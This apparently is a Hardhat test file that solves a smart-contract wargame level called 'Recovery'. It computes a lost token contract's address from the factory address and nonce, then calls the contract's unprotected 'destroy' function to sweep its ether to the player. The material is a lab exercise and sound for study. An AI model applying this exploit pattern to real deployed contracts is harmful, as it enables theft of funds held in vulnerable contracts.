const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██████╗░███████╗░█████╗░░█████╗░██╗░░░██╗███████╗██████╗░██╗░░░██╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗██║░░░██║██╔════╝██╔══██╗╚██╗░██╔╝
██████╔╝█████╗░░██║░░╚═╝██║░░██║╚██╗░██╔╝█████╗░░██████╔╝░╚████╔╝░
██╔══██╗██╔══╝░░██║░░██╗██║░░██║░╚████╔╝░██╔══╝░░██╔══██╗░░╚██╔╝░░
██║░░██║███████╗╚█████╔╝╚█████╔╝░░╚██╔╝░░███████╗██║░░██║░░░██║░░░
╚═╝░░╚═╝╚══════╝░╚════╝░░╚════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░

 * Goal: 
 * 
 * A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. 
 * After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. 
 * They have since lost the contract address.
 * This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.
 * 
 * Solution:
 *
 * To resolve this layer, we need to withdraw the funds transferred from the deployer to the SimpleToken from 
 * the contract itself. As we can see, the contract has the "destroy" function which as we know allows us to 
 * destroy the contract by sending all its funds inside to a specific address. 
 * The basic problem is to find the address of this contract, which has been forgotten by the deployer. 
 * To do this, we will simply check on an explorer (eg. etherscan) the transaction history of the factory (Recovery). 
 * See, in this case, which is the first contract that was created by Recovery. 
 * To be on the safer side we will just check what address the deployer sent 0.001 ETH to by also checking the 
 * timestamp for safety. 
 * Since in this test we do not have an explorer where we can verify the various transactions, we do know, however, 
 * that the address of a contract is deterministic and is therefore generated from the current address and nonce 
 * (number that identifies the number of transactions made) of that address.
 * Once we get the address we could call the public function "destroy" passing the player address and that's it.
 * 
 */
describe("Recovery", function () {
    let recovery, owner, player;

    // we know the function destroy from contract
    let ABI = ["function destroy(address payable _to) public"];

    before(async function () {
        [owner, player] = await ethers.getSigners();

        const Recovery = await ethers.getContractFactory("contracts/Recovery/Recovery.sol:Recovery");
        recovery = await Recovery.connect(owner).deploy();

        await recovery.connect(owner).generateToken("SimpleTokenToRecover", 1000000, { gasLimit: "3000000" });

        // we don't know tokenAddress, but the deployer does. see below ..
        // await owner.sendTransaction({ from: owner.address, to: tokenAddress, value: ethers.utils.parseEther("0.001"), gasLimit: "3000000" });
    });

    describe("Recover the wallet address and withdraw all funds", async function () {
        let tokenBalanceBeforeDestroy, tokenBalanceAfterDestroy, playerBalanceBeforeDestroy, playerBalanceAfterDestroy;

        it("Should recovers the wallet address with all funds", async function () {
            // get contract address using nonce + deployer address (the contract address is deterministic)
            const nonce = (await owner.getTransactionCount()) - 1;
            const tokenAddress = ethers.utils.getContractAddress({ from: recovery.address, nonce });

            // assume that this transaction was executed immediately after the deployment of the SimpleToken. see above ..
            await owner.sendTransaction({ from: owner.address, to: tokenAddress, value: ethers.utils.parseEther("0.001"), gasLimit: "3000000" });

            tokenBalanceBeforeDestroy = ethers.utils.formatEther(await ethers.provider.getBalance(tokenAddress));
            playerBalanceBeforeDestroy = ethers.utils.formatEther(await ethers.provider.getBalance(player.address));

            let iface = new ethers.utils.Interface(ABI);
            const dataDestroy = iface.encodeFunctionData("destroy", [player.address]);

            await player.sendTransaction({ from: player.address, to: tokenAddress, data: dataDestroy });
            tokenBalanceAfterDestroy = ethers.utils.formatEther(await ethers.provider.getBalance(tokenAddress));
            playerBalanceAfterDestroy = ethers.utils.formatEther(await ethers.provider.getBalance(player.address));
        });

        it("show result", async function () {
            console.table({
                before_destroy: {
                    tokenBalance: `${tokenBalanceBeforeDestroy} ETH`,
                    playerBalance: `${playerBalanceBeforeDestroy} ETH`,
                },
                after_destroy: {
                    tokenBalance: `${tokenBalanceAfterDestroy} ETH`,
                    playerBalance: `${playerBalanceAfterDestroy.substring(0,12)} ETH`,
                },
            });
        });
    });
});
